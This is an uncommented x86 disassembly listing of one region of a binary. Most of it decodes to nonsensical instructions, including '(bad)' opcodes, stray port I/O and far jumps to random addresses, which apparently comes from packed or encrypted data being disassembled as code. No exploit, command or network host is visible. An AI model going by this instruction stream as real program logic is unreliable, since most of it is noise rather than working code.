  41792c:	pop    DWORD PTR [esi]
  41792e:	add    eax,0xd975eef
  417933:	int    0xeb
  417935:	dec    ebx
  417936:	(bad)
  41793a:	sahf   
  41793b:	cld    
  41793c:	jne    0x4178e1
  41793e:	or     eax,0xf71d0c7f
  417943:	and    al,0xdb
  417945:	mov    esp,0x670b21c8
  41794a:	dec    ecx
  41794b:	sub    BYTE PTR ds:0xaa6d679b,0x39
  417952:	mov    edx,DWORD PTR [edi+edi*2+0x51705b31]
  417959:	dec    eax
  41795a:	mov    DWORD PTR [ebx+0x1c],ebp
  41795d:	pop    ebx
  41795e:	dec    esi
  41795f:	pusha  
  417960:	stos   BYTE PTR es:[edi],al
  417961:	xor    bh,BYTE PTR [ebp+0x69]
  417964:	jle    0x417978
  417966:	ja     0x417921
  417968:	push   0xba4f5bcb
  41796d:	cdq    
  41796e:	or     al,0x8e
  417970:	in     eax,dx
  417971:	out    dx,eax
  417972:	sbb    al,0xa2
  417974:	xchg   ebp,eax
  417975:	adc    al,0x4d
  417977:	jo     0x417985
  417979:	inc    eax
  41797a:	js     0x4179de
  41797c:	push   eax
  41797d:	jno    0x4179aa
  41797f:	fdivrp st(6),st
  417981:	sbb    esp,DWORD PTR [edi+0x67]
  417984:	push   eax
  417985:	xchg   esi,eax
  417986:	out    dx,eax
  417987:	xchg   edi,eax
  417988:	(bad)  
  417989:	cwde   
  41798a:	aam    0x28
  41798c:	adc    BYTE PTR [ecx-0x79],cl
  41798f:	jle    0x4179de
  417991:	stc    
  417992:	std    
  417993:	int3   
  417994:	jno    0x4179a2
  417996:	inc    eax
  417997:	dec    eax
  417998:	cmp    al,0x2a
  41799a:	aas    
  41799b:	add    ebx,DWORD PTR [ebx+0x4]
  41799e:	mov    ebp,0x4a1cf8a9
  4179a3:	hlt    
  4179a4:	es xchg edx,eax
  4179a6:	je     0x4179b2
  4179a8:	sbb    bl,ch
  4179aa:	icebp  
  4179ab:	es retf 0x4ab8
  4179af:	data16 fsubr DWORD PTR ds:[eax+0x2427798a]
  4179b7:	icebp  
  4179b8:	imul   edx,DWORD PTR [edx-0x32],0xe10d5a35
  4179bf:	sub    eax,0x8723182c
  4179c4:	jb     0x41796c
  4179c6:	jno    0x4179e5
  4179c8:	adc    DWORD PTR [ecx],edi
  4179ca:	push   edi
  4179cb:	sbb    eax,0x918ab69d
  4179d0:	jp     0x417a49
  4179d2:	(bad)  
  4179d4:	test   BYTE PTR [ecx-0x799fc48],dl
  4179da:	mov    dl,ch
  4179dc:	lock es add eax,0xaa8a27c
  4179e3:	fiadd  WORD PTR [edi-0x464df93c]
  4179e9:	jae    0x417a1d
  4179eb:	inc    ebp
  4179ec:	cmp    DWORD PTR [edi],0x4f82c26c
  4179f2:	pop    edx
  4179f3:	cli    
  4179f4:	inc    esi
  4179f5:	pop    esi
  4179f6:	data16 add BYTE PTR [ebx+0x24],bl
  4179fa:	pop    edx
  4179fb:	jle    0x417a02
  4179fd:	imul   esi,ecx,0x17c64f41
  417a03:	ss sub eax,0x40cbc2f8
  417a09:	jmp    0xc2795e30
  417a0e:	jo     0x4179df
  417a10:	ins    BYTE PTR es:[edi],dx
  417a11:	mov    WORD PTR [ebx],?
  417a13:	je     0x4179cf
  417a15:	and    DWORD PTR [ebx],ecx
  417a17:	inc    edx
  417a18:	inc    eax
  417a19:	sub    al,0xea
  417a1b:	inc    eax
  417a1c:	push   ecx
  417a1d:	add    eax,0x2bccb4b7
  417a22:	popa   
  417a23:	ret    
  417a24:	jb     0x417a52
  417a26:	(bad)  
  417a27:	imul   BYTE PTR [ecx+0x1b0833b4]
  417a2d:	mov    esp,DWORD PTR [ebx+0xe]
  417a30:	pusha  
  417a31:	adc    dh,al
  417a33:	pop    es
  417a34:	leave  
  417a35:	jno    0x417aac
  417a37:	add    ch,BYTE PTR [eax-0x50293a7f]
  417a3d:	and    cl,BYTE PTR [edx]
  417a3f:	out    dx,eax
  417a40:	and    eax,0x848e8722
  417a45:	ja     0x417a61
  417a47:	adc    eax,0xfd32d9eb
  417a4c:	mov    ecx,0xf811a3b2
  417a51:	mov    ecx,0xe6b9674d
  417a56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a57:	mov    sp,0xa7d1
  417a5b:	scas   eax,DWORD PTR es:[edi]
  417a5c:	aas    
  417a5d:	adc    al,0xe0
  417a5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a61:	pop    edi
  417a62:	gs adc edi,0x54b61729
  417a69:	and    al,0x12
  417a6b:	pusha  
  417a6c:	sub    eax,0x7b08dd9a
  417a71:	sbb    eax,0xbe2db9fd
  417a76:	outs   dx,BYTE PTR ds:[esi]
  417a77:	push   es
  417a78:	jle    0x417a1d
  417a7a:	sar    BYTE PTR [ecx],cl
  417a7c:	jbe    0x417af1
  417a7e:	push   eax
  417a7f:	lds    esi,FWORD PTR ds:0x1bff1a12
  417a85:	pop    es
  417a86:	inc    ecx
  417a87:	add    BYTE PTR [edi],cl
  417a89:	pop    ds
  417a8a:	shr    DWORD PTR [eax+0x40],cl
  417a8d:	dec    esi
  417a8e:	jl     0x417a9f
  417a90:	xor    al,0xc8
  417a92:	jmp    DWORD PTR ds:0x7313ae06
  417a98:	(bad)  
  417a99:	mov    ds:0x16838b73,al
  417a9e:	loop   0x417a79
  417aa0:	mov    ch,0xc9
  417aa2:	pop    ebp
  417aa3:	mov    bl,BYTE PTR ds:[edx+0x524d14e5]
  417aaa:	mov    ds:0x62265d05,al
  417aaf:	out    dx,al
  417ab0:	or     BYTE PTR [esi],dl
  417ab2:	sbb    BYTE PTR [edi+0x69],al
  417ab5:	xchg   edi,eax
  417ab6:	sbb    bl,BYTE PTR [ecx+0x3c]
  417ab9:	add    eax,0x3b9900a4
  417abe:	mov    ebp,0x81e2076a
  417ac3:	hlt    
  417ac4:	mov    eax,edx
  417ac6:	push   0x137682a7
  417acb:	dec    edx
  417acc:	or     DWORD PTR [ebp+0x11],esi
  417acf:	outs   dx,BYTE PTR ds:[esi]
  417ad0:	or     eax,0x545a49b5
  417ad5:	div    edx
  417ad7:	cmc    
  417ad8:	scas   al,BYTE PTR es:[edi]
  417ad9:	cwde   
  417ada:	jmp    0x95c7a8d9
  417adf:	out    0xe9,eax
  417ae1:	icebp  
  417ae2:	mov    eax,0x6d64d8d8
  417ae7:	jecxz  0x417b4c
  417ae9:	pop    ecx
  417aea:	sbb    al,BYTE PTR [ebx]
  417aec:	mov    ebx,0x64a80d5c
  417af1:	push   ebx
  417af2:	loopne 0x417afa
  417af4:	mov    ds:0xcab8a4d4,eax
  417af9:	sub    edx,DWORD PTR [eax]
  417afb:	jmp    0x417ac4
  417afd:	pushf  
  417afe:	rep ins DWORD PTR es:[edi],dx
  417b00:	or     al,0xb
  417b02:	and    al,0x2e
  417b04:	add    al,0x53
  417b06:	leave  
  417b07:	push   eax
  417b08:	test   bl,0xe9
  417b0b:	in     eax,dx
  417b0c:	add    BYTE PTR [edx],dl
  417b0e:	clc    
  417b0f:	loope  0x417b62
  417b11:	xchg   esp,eax
  417b12:	jmp    0x417b31
  417b14:	xchg   ebp,eax
  417b15:	(bad)  
  417b16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b17:	cli    
  417b18:	inc    eax
  417b19:	in     al,dx
  417b1a:	sub    BYTE PTR [esi],dh
  417b1c:	mov    WORD PTR [edx-0x6ed88022],ds
  417b22:	adc    eax,0xd5f9806a
  417b27:	out    0x9c,al
  417b29:	xlat   BYTE PTR ds:[ebx]
  417b2a:	sbb    eax,DWORD PTR [ebx+eax*8]
  417b2d:	lods   eax,DWORD PTR ds:[esi]
  417b2e:	add    al,0xd7
  417b30:	sbb    al,0xfd
  417b32:	push   esp
  417b33:	jne    0x417b5b
  417b35:	push   ds
  417b36:	daa    
  417b37:	adc    dh,bl
  417b39:	jle    0x417ac0
  417b3b:	scas   al,BYTE PTR es:[edi]
  417b3c:	jmp    0x1f24:0x58ed16c5
  417b43:	mov    ds:0x858cc138,eax
  417b48:	jmp    0x417b2c
  417b4a:	xchg   ebp,eax
  417b4b:	aaa    
  417b4c:	and    esi,ecx
  417b4e:	cmp    ebp,DWORD PTR [ecx-0x7519a27b]
  417b54:	rep ins BYTE PTR es:[edi],dx
  417b56:	sub    DWORD PTR [ebp-0x8],edi
  417b59:	xor    ch,dh
  417b5b:	popf   
  417b5c:	add    eax,0x93541589
  417b61:	pop    ebx
  417b62:	jmp    0x2468c802
  417b67:	push   ebx
  417b68:	pop    eax
  417b69:	sub    DWORD PTR [esi+0x3c],0xffffffe6
  417b6d:	nop
  417b6e:	push   ecx
  417b6f:	and    ah,BYTE PTR [esi]
  417b71:	xchg   DWORD PTR [ecx-0x4d],edi
  417b74:	aaa    
  417b75:	jno    0x417be7
  417b77:	fwait
  417b78:	pop    ebx
  417b79:	mov    ecx,0x10f43c65
  417b7e:	pop    es
  417b7f:	pushf  
  417b80:	sub    eax,0x13cf7281
  417b85:	push   ss
  417b86:	into   
  417b87:	dec    esi
  417b88:	cmp    BYTE PTR [esi+0x33e5c4fe],dl
  417b8e:	jecxz  0x417b2f
  417b90:	xor    BYTE PTR [edi],0xab
  417b93:	pop    ecx
  417b94:	push   es
  417b95:	aaa    
  417b96:	test   edx,0x1c23e80
  417b9c:	cmp    eax,0xfbe20161
  417ba1:	or     bh,BYTE PTR [ecx+eax*2+0x695045a6]
  417ba8:	cld    
  417ba9:	sub    bh,ah
  417bab:	les    ebp,FWORD PTR ds:0xf07b0b92
  417bb1:	push   ecx
  417bb2:	in     al,0xf2
  417bb4:	add    DWORD PTR [ebx+ecx*8+0x3d90f214],0x10
  417bbc:	pushf  
  417bbd:	cmovp  edx,DWORD PTR [edi+0x3bc6b118]
  417bc4:	cs jge 0x417bfe
  417bc7:	fwait
  417bc8:	dec    edi
  417bc9:	pop    edi
  417bca:	sbb    ebp,DWORD PTR [ecx+0x518d39cb]
  417bd0:	and    bh,bh
  417bd2:	(bad)  
  417bd4:	les    ebx,FWORD PTR [ebp-0x30c8c874]
  417bda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417bdb:	test   eax,eax
  417bdd:	and    DWORD PTR [bp+di],0x99d59b2d
  417be4:	arpl   cx,bx
  417be6:	gs cmp eax,0xdcf7c8e6
  417bec:	pop    ds
  417bed:	fst    QWORD PTR [ecx+eax*8+0x5309f856]
  417bf4:	int3   
  417bf5:	icebp  
  417bf6:	sahf   
  417bf7:	push   0x4dd53747
  417bfc:	xor    edi,esp
  417bfe:	cs cmp eax,0xa78422e5
  417c04:	jnp    0x417c07
  417c06:	xor    DWORD PTR [edx+0x62],edx
  417c09:	test   bl,ah
  417c0b:	push   0xffffffd4
  417c0d:	pushf  
  417c0e:	mov    BYTE PTR [ebp+0x3e],al
  417c11:	das    
  417c12:	xor    al,0x2d
  417c14:	mov    al,ds:0x7995cfc5
  417c19:	std    
  417c1a:	dec    ebp
  417c1b:	jl     0x417c15
  417c1d:	out    dx,al
  417c1e:	mov    esp,0x3af43884
  417c23:	sbb    al,0x21
  417c25:	repz ror BYTE PTR [eax+0x7cf1d81a],cl
  417c2c:	bnd jmp 0x417bb1
  417c2f:	sub    eax,0x554a6089
  417c34:	xchg   edi,eax
  417c35:	bnd jae 0x417bde
  417c38:	daa    
  417c39:	test   eax,0x53e32c64
  417c3e:	or     eax,0x535d72dd
  417c43:	mov    al,ds:0x70fb3a0a
  417c48:	or     edi,DWORD PTR [eax-0x42541e1]
  417c4e:	(bad)  
  417c50:	imul   ebx,esi,0x2f
  417c53:	push   esp
  417c54:	out    0x97,eax
  417c56:	mov    bl,BYTE PTR [ebx-0x76]
  417c59:	inc    ecx
  417c5a:	out    0x24,eax
  417c5c:	dec    ecx
  417c5d:	aad    0x73
  417c5f:	mov    bl,0x1a
  417c61:	xlat   BYTE PTR ds:[ebx]
  417c62:	and    eax,0x2549a614
  417c67:	xchg   esp,eax
  417c68:	mov    esp,0x917cd506
  417c6d:	jp     0x417c86
  417c6f:	aad    0x25
  417c71:	fcmove st,st(4)
  417c73:	inc    edi
  417c74:	shl    BYTE PTR [ebx-0x5b],0xe8
  417c78:	dec    ebp
  417c79:	sbb    BYTE PTR [ebx-0x7ae0abc3],ch
  417c7f:	addr16 push eax
  417c81:	xchg   BYTE PTR [esi],ah
  417c83:	sbb    ebx,DWORD PTR [edi+esi*2+0x3e15a75f]
  417c8a:	jno    0x417c2c
  417c8c:	pop    ebx
  417c8d:	daa    
  417c8e:	xchg   DWORD PTR ds:0xd8c44795,edx
  417c94:	sub    eax,0xf993f199
  417c99:	retf   0xe93
  417c9c:	sbb    eax,0x5b3447e
  417ca1:	jecxz  0x417d1a
  417ca3:	sub    eax,esp
  417ca5:	or     eax,ebx
  417ca7:	imul   esi,edi,0x37
  417caa:	data16 daa 
  417cac:	mov    ebx,0x768c84d8
  417cb1:	in     eax,dx
  417cb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417cb3:	cli    
  417cb4:	mov    al,0xff
  417cb6:	aas    
  417cb7:	fistp  DWORD PTR [ebp-0x421a0e78]
  417cbd:	mov    edi,0xd5b06825
  417cc2:	iret   
  417cc3:	neg    edx
  417cc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417cc6:	aaa    
  417cc7:	lea    edx,[esi+0x1]
  417cca:	icebp  
  417ccb:	fcomp  DWORD PTR [edi+0x63]
  417cce:	mov    ch,BYTE PTR [di-0x72ef]
  417cd3:	js     0x417cf8
  417cd5:	sub    eax,0xa7ad8c4
  417cda:	lock pmaxub mm6,QWORD PTR [eax-0x77]
  417cdf:	inc    edi
  417ce0:	test   DWORD PTR [edi+edi*1-0x71],0x6e09b163
  417ce8:	or     eax,0x5835bde6
  417ced:	or     edx,0xe577c615
  417cf3:	and    eax,0x61a2870b
  417cf8:	aad    0xc0
  417cfa:	sub    DWORD PTR ds:0x2e068714,edx
  417d00:	jp     0x417c89
  417d02:	popf   
  417d03:	ins    DWORD PTR es:[edi],dx
  417d04:	xor    ecx,edx
  417d06:	es into 
  417d08:	aaa    
  417d09:	push   ds
  417d0a:	inc    edi
  417d0b:	ret    
  417d0c:	mov    dl,0x45
  417d0e:	aam    0x9f
  417d10:	call   DWORD PTR [ebx]
  417d12:	arpl   WORD PTR [ebp+0x6],si
  417d15:	cs pop ecx
  417d17:	pop    ds
  417d18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d19:	or     DWORD PTR [ebp+0x27af7b9a],0x97e2d33
  417d23:	(bad)  [edi-0x54]
  417d26:	daa    
  417d27:	icebp  
  417d28:	popf   
  417d29:	mov    cl,0xd5
  417d2b:	sub    DWORD PTR [ebx],edi
  417d2d:	out    0x44,al
  417d2f:	pop    edx
  417d30:	shl    DWORD PTR [ecx-0x7d1f41c],cl
  417d36:	je     0x417d13
  417d38:	gs fs popa 
  417d3b:	out    0x77,al
  417d3d:	dec    ebp
  417d3e:	pop    ds
  417d3f:	push   ecx
  417d40:	xor    al,0xd0
  417d42:	imul   esp,DWORD PTR [edx],0xdf65e8b9
  417d48:	popf   
  417d49:	ss fwait
  417d4b:	outs   dx,BYTE PTR ds:[esi]
  417d4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d4d:	inc    edx
  417d4e:	mov    WORD PTR [esi-0x24],fs
  417d51:	nop
  417d52:	sub    dh,al
  417d54:	imul   ebx,ebp,0xffffffef
  417d57:	dec    eax
  417d58:	ja     0x417d03
  417d5a:	mov    al,0x58
  417d5c:	xor    eax,0xad6f60fe
  417d61:	inc    ecx
  417d62:	ins    BYTE PTR es:[edi],dx
  417d63:	or     DWORD PTR [edx-0x3c5fba2a],edx
  417d69:	push   ebp
  417d6a:	push   ds
  417d6b:	xchg   ebp,eax
  417d6c:	jmp    0x8b2e:0x7829a5c3
  417d73:	inc    ebp
  417d74:	cmp    BYTE PTR [ebp+0xc],al
  417d77:	add    DWORD PTR [eax+0x661d4c3d],ecx
  417d7d:	adc    al,0xb4
  417d7f:	shl    DWORD PTR [ebx-0x31],0x68
  417d83:	xor    al,0xdc
  417d85:	push   eax
  417d86:	cmp    dh,BYTE PTR [ebx-0x30]
  417d89:	jbe    0x417dec
  417d8b:	cmp    al,0xa9
  417d8d:	jbe    0x417d33
  417d8f:	mov    dl,0x6f
  417d91:	rep ins BYTE PTR es:[edi],dx
  417d93:	test   eax,0x18a879a0
  417d98:	mov    al,ds:0x6e4b16a
  417d9d:	std    
  417d9e:	push   ecx
  417d9f:	ret    
  417da0:	lahf   
  417da1:	ds pop esi
  417da3:	(bad)  
  417da5:	ret    
  417da6:	mov    ecx,eax
  417da8:	es inc ecx
  417daa:	xchg   esi,eax
  417dab:	pop    ecx
  417dac:	jnp    0x417e2a
  417dae:	push   0x483c6310
  417db3:	mov    ds:0xe71a8f68,eax
  417db8:	sbb    bh,BYTE PTR ds:0xf3526f2b
  417dbe:	in     al,0x7b
  417dc0:	push   0x45318b8a
  417dc5:	fistp  DWORD PTR [esi-0x7a1432fd]
  417dcb:	sbb    BYTE PTR [edx],0x6e
  417dce:	mov    esi,0x52672545
  417dd3:	(bad)  
  417dd4:	ja     0x417db4
  417dd6:	mov    esp,0x63c4b76d
  417ddb:	or     edx,DWORD PTR [esi+ebp*8+0x46]
  417ddf:	stc    
  417de0:	mov    eax,0x98fdfb78
  417de5:	aam    0xf2
  417de7:	fnstsw WORD PTR [esi]
  417de9:	sbb    esp,DWORD PTR [ebx+0x7b]
  417dec:	add    BYTE PTR [edx+0x2eacee83],0x7b
  417df3:	xchg   esp,eax
  417df4:	test   eax,0x79b224dc
  417df9:	inc    edx
  417dfa:	stc    
  417dfb:	inc    DWORD PTR [ecx]
  417dfd:	test   DWORD PTR [ebp-0x2f],ebx
  417e00:	stos   DWORD PTR es:[edi],eax
  417e01:	cmp    esp,DWORD PTR [ebp+0x706b7bd6]
  417e07:	dec    eax
  417e08:	xlat   BYTE PTR ds:[ebx]
  417e09:	push   ebp
  417e0a:	std    
  417e0b:	scas   eax,DWORD PTR es:[edi]
  417e0c:	fmul   QWORD PTR [esi-0x445ebc85]
  417e12:	out    0xca,al
  417e14:	in     al,dx
  417e15:	adc    al,0x8
  417e17:	mov    al,0x77
  417e19:	jge    0x417de7
  417e1b:	scas   al,BYTE PTR es:[edi]
  417e1c:	ror    BYTE PTR [esi+0x1417f798],0x57
  417e23:	ret    0xcbd8
  417e26:	dec    eax
  417e27:	inc    esp
  417e28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e29:	adc    eax,0xe04d8bb3
  417e2e:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  417e35:	mov    edx,DWORD PTR [ebp+0xc]
  417e38:	cmp    cl,BYTE PTR [edx]
  417e3a:	jne    0x420de3
  417e40:	mov    ecx,DWORD PTR [ebp-0x14]
  417e43:	mov    edx,DWORD PTR [ebp+0xc]
  417e46:	movsx  edx,BYTE PTR [edx]
  417e49:	xor    ecx,eax
  417e4b:	add    ecx,esi
  417e4d:	jmp    0x41a1da
  417e52:	cmp    DWORD PTR [ecx],ecx
  417e54:	mov    ebp,0x79c6ad42
  417e59:	stc    
  417e5a:	mov    DWORD PTR [ebp-0x58],edi
  417e5d:	fxch   st(4)
  417e5f:	repz sti 
  417e61:	fidivr WORD PTR [eax]
  417e64:	jge    0x417ee0
  417e66:	or     bl,BYTE PTR [edi+0x7a]
  417e69:	jp     0x417e5a
  417e6b:	jge    0x417ec2
  417e6d:	xchg   ebp,eax
  417e6e:	mov    cs,WORD PTR [edx-0x14]
  417e71:	and    BYTE PTR [ebx+0x75],dh
  417e74:	in     eax,0xb
  417e76:	adc    DWORD PTR [edx-0x5e],ebx
  417e79:	xchg   ebx,ebp
  417e7b:	or     DWORD PTR [ebx+0x78dca36d],esp
  417e81:	out    0x6,eax
  417e83:	cmc    
  417e84:	arpl   ax,bx
  417e86:	mov    ds:0x548031b6,eax
  417e8b:	gs and eax,0x52403c51
  417e91:	and    eax,0x724b600c
  417e96:	lahf   
  417e97:	sar    BYTE PTR ds:0xee16b373,1
  417e9d:	es mov ah,0xa6
  417ea0:	sbb    DWORD PTR [ebp-0x62d444d4],edx
  417ea6:	mov    esp,0x9489139
  417eab:	fsubr  QWORD PTR [ecx+0x6c]
  417eae:	shl    edx,1
  417eb0:	jbe    0x417ed8
  417eb2:	push   esi
  417eb3:	sbb    al,0xc2
  417eb5:	out    0x57,eax
  417eb7:	mov    ebp,0x613b9ab1
  417ebc:	inc    ebx
  417ebd:	neg    bl
  417ebf:	inc    edi
  417ec0:	(bad)  
  417ec2:	lods   al,BYTE PTR ds:[esi]
  417ec3:	in     al,dx
  417ec4:	shr    BYTE PTR [eax],0x45
  417ec7:	adc    eax,0xaceb29ee
  417ecc:	xchg   edx,eax
  417ecd:	cli    
  417ece:	pushf  
  417ecf:	mov    esi,0xaad4be0d
  417ed4:	xlat   BYTE PTR ds:[ebx]
  417ed5:	push   ecx
  417ed6:	and    bh,bh
  417ed8:	gs jns 0x417ee7
  417edb:	sub    dh,ch
  417edd:	cmp    DWORD PTR [esi-0x2432850f],esi
  417ee3:	xor    ecx,esi
  417ee5:	push   edx
  417ee6:	clc    
  417ee7:	push   cs
  417ee8:	leave  
  417ee9:	repz cmp BYTE PTR [edx],ch
  417eec:	jg     0x417f48
  417eee:	cdq    
  417eef:	popf   
  417ef0:	js     0x417f3f
  417ef2:	(bad)  
  417ef3:	cld    
  417ef4:	push   esp
  417ef5:	pop    ebx
  417ef6:	or     dh,BYTE PTR [edi]
  417ef8:	mov    ah,0x20
  417efa:	sub    esi,DWORD PTR [esi+0xbb464c6]
  417f00:	cmp    DWORD PTR [ecx],edi
  417f02:	std    
  417f03:	shl    BYTE PTR [edx-0x35],cl
  417f06:	xchg   edx,eax
  417f07:	cdq    
  417f08:	mov    WORD PTR [esi],gs
  417f0a:	push   esi
  417f0b:	(bad)  
  417f0c:	jmp    0x421c:0xd8a4b298
  417f13:	and    al,0xa2
  417f15:	ret    
  417f16:	int    0xe3
  417f18:	pop    es
  417f19:	inc    esp
  417f1a:	es jb  0x417f2d
  417f1d:	outs   dx,BYTE PTR ds:[esi]
  417f1e:	popa   
  417f1f:	mov    ?,eax
  417f21:	outs   dx,BYTE PTR ds:[esi]
  417f22:	jmp    0x417f84
  417f24:	dec    ebx
  417f25:	jno    0x417eb8
  417f27:	push   esi
  417f28:	jns    0x417fa2
  417f2a:	cmp    eax,DWORD PTR [edi]
  417f2c:	mov    ds,WORD PTR [edx]
  417f2e:	sbb    eax,esi
  417f30:	fs fld TBYTE PTR es:[eax+ebp*4-0x53bfab07]
  417f39:	dec    ebp
  417f3a:	mov    al,0xd9
  417f3c:	imul   ecx,DWORD PTR [edi+0x6b],0x7e934fb8
  417f43:	imul   ebx,DWORD PTR ds:0x4f3f04ef,0x1b2ff147
  417f4d:	add    eax,0xb8c1f47b
  417f52:	fdivr  DWORD PTR [ebp-0x76d3e6c1]
  417f58:	xlat   BYTE PTR ds:[ebx]
  417f59:	test   DWORD PTR [ecx+0x50],0xfb824cd8
  417f60:	test   DWORD PTR [ebx+0x3b],edx
  417f63:	retf   
  417f64:	pop    eax
  417f65:	icebp  
  417f66:	mov    bl,0xae
  417f68:	call   0x4fa3:0xcfdbe4b1
  417f6f:	add    bl,BYTE PTR [edx+ebx*4]
  417f72:	cdq    
  417f73:	in     eax,0x92
  417f75:	cwde   
  417f76:	dec    ebp
  417f77:	xor    BYTE PTR [ecx],0xdc
  417f7a:	shl    DWORD PTR [edi+0x76b75522],1
  417f80:	rol    dh,1
  417f82:	push   ecx
  417f83:	and    DWORD PTR [eax-0x8],esp
  417f86:	add    dl,BYTE PTR [edi-0x1c500874]
  417f8c:	rcl    BYTE PTR [ecx-0x40147c37],cl
  417f92:	lahf   
  417f93:	popa   
  417f94:	sar    DWORD PTR [ebx],cl
  417f96:	shl    BYTE PTR [eax-0x726e9fa5],0xcb
  417f9d:	scas   al,BYTE PTR es:[edi]
  417f9e:	je     0x418002
  417fa0:	inc    ebp
  417fa1:	push   es
  417fa2:	xchg   ebx,eax
  417fa3:	cli    
  417fa4:	lea    ecx,[ecx]
  417fa6:	iret   
  417fa7:	call   0xeaf5:0xcbca9484
  417fae:	jno    0x417f37
  417fb0:	(bad)  
  417fb1:	mov    edi,0x48948d5a
  417fb6:	xlat   BYTE PTR ds:[ebx]
  417fb7:	dec    esi
  417fb8:	push   0xd78d8011
  417fbd:	or     BYTE PTR [esp+edi*1+0x56],bl
  417fc1:	ins    DWORD PTR es:[edi],dx
  417fc2:	out    0x59,al
  417fc4:	or     eax,0x99ffc19
  417fc9:	shr    DWORD PTR [ecx],1
  417fcb:	test   eax,0x2d2e8379
  417fd0:	retf   0x8f35
  417fd3:	data16 clc 
  417fd5:	xor    BYTE PTR [eax-0x51],0xad
  417fd9:	pop    es
  417fda:	cwde   
  417fdb:	js     0x418024
  417fdd:	loope  0x417fe8
  417fdf:	jo     0x417fb3
  417fe1:	sbb    BYTE PTR [ebx],al
  417fe3:	call   0xc09d:0x4d41a54b
  417fea:	xchg   DWORD PTR [ecx],ecx
  417fec:	lods   eax,DWORD PTR ds:[esi]
  417fed:	sub    BYTE PTR [edx+0x47e50fa8],bl
  417ff3:	into   
  417ff4:	jbe    0x417fcd
  417ff6:	push   0xffffffaf
  417ff8:	and    al,0xa8
  417ffa:	arpl   WORD PTR [ebx+0xb],dx
  417ffd:	and    ah,BYTE PTR [ebx+0x41cf2454]
  418003:	inc    eax
  418004:	pushf  
  418005:	xlat   BYTE PTR ds:[ebx]
  418006:	dec    esi
  418007:	add    cl,BYTE PTR [edx+0x3]
  41800a:	pusha  
  41800b:	sbb    al,0x39
  41800d:	data16 ds ds int 0xac
  418012:	in     eax,0x9c
  418014:	popf   
  418015:	lea    esp,[ebp-0x27]
  418018:	fimul  WORD PTR [esp+ebx*2]
  41801b:	inc    esi
  41801c:	inc    edx
  41801d:	imul   ecx,DWORD PTR [ebp-0x1d],0x7e
  418021:	xor    al,0x40
  418023:	or     DWORD PTR [eax+0x9368be],0x22
  41802a:	out    dx,al
  41802b:	test   eax,0x4b892242
  418030:	std    
  418031:	fs cdq 
  418033:	lods   eax,DWORD PTR ds:[esi]
  418034:	test   eax,0x3e52f68b
  418039:	mov    ebp,0x2b04898d
  41803e:	test   al,0x4c
  418040:	jle    0x417ffe
  418042:	or     eax,0xea309567
  418047:	cmp    al,0x1e
  418049:	sbb    DWORD PTR [ebx],ebp
  41804b:	jg     0x418058
  41804d:	js     0x417fd0
  41804f:	push   eax
  418050:	repz xchg ebx,eax
  418052:	ret    
  418053:	sti    
  418054:	dec    ebp
  418055:	inc    esp
  418056:	fistp  QWORD PTR [eax-0x77]
  418059:	sbb    esi,DWORD PTR [ebx+0x1b052570]
  41805f:	popf   
  418060:	icebp  
  418061:	cmp    al,0x97
  418063:	pushf  
  418064:	xchg   edi,eax
  418065:	js     0x4180d8
  418067:	push   edx
  418068:	in     al,dx
  418069:	dec    ecx
  41806a:	shl    BYTE PTR [ecx+eax*8-0x45],0xc4
  41806f:	iret   
  418070:	ss aas 
  418072:	adc    edi,ebx
  418074:	fldenv [eax-0x7686d943]
  41807a:	imul   esi,DWORD PTR [ebx],0xffffffae
  41807d:	xchg   esp,eax
  41807e:	pop    ebx
  41807f:	sbb    al,0x29
  418081:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418082:	cmp    bl,cl
  418084:	adc    edx,DWORD PTR [ecx-0x161e8cde]
  41808a:	jbe    0x41800c
  41808c:	lods   al,BYTE PTR ds:[esi]
  41808d:	stos   DWORD PTR es:[edi],eax
  41808e:	mov    ds:0x39420bc0,eax
  418093:	pop    esi
  418094:	xor    ch,BYTE PTR [esi-0x4d]
  418097:	jmp    0x418036
  418099:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41809a:	popa   
  41809b:	ror    DWORD PTR [edi-0x6dcc77b7],cl
  4180a1:	mov    eax,ds:0xd2919ae2
  4180a6:	cs gs mov ecx,0xc12aef48
  4180ad:	gs call 0x828:0x7e778af8
  4180b5:	cs jg  0x41806c
  4180b8:	push   ss
  4180b9:	into   
  4180ba:	mov    ebp,DWORD PTR [esi]
  4180bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4180bd:	ret    
  4180be:	mov    ds:0xbeddb926,eax
  4180c3:	cmp    DWORD PTR [ecx-0x72],esp
  4180c6:	shl    BYTE PTR [esp+ebp*2+0x1856056d],0x77
  4180ce:	pop    ecx
  4180cf:	jo     0x418100
  4180d1:	fisubr DWORD PTR [eax-0x66435c0f]
  4180d7:	fcomp  DWORD PTR ds:0xdec0ad1b
  4180dd:	cmp    esp,edi
  4180df:	mov    ds:0x442933de,eax
  4180e4:	dec    ecx
  4180e5:	js     0x4180c7
  4180e7:	pop    ecx
  4180e8:	fistp  WORD PTR gs:[edx+eax*1-0x4cb9f1a6]
  4180f0:	jl     0x4180d2
  4180f2:	in     al,0xc7
  4180f4:	mov    esi,DWORD PTR [edx+0x4834df3f]
  4180fa:	push   esp
  4180fb:	arpl   WORD PTR [ebp-0x46],sp
  4180fe:	lea    esi,[esi+0x7a09f5db]
  418104:	sub    al,0xb7
  418106:	js     0x418119
  418108:	dec    esi
  418109:	pop    eax
  41810a:	loop   0x41814a
  41810c:	jg     0x4180d0
  41810e:	ja     0x418160
  418110:	jle    0x418179
  418112:	(bad)  [ecx]
  418114:	inc    esi
  418115:	and    DWORD PTR [ecx],0xde841142
  41811b:	push   edi
  41811c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
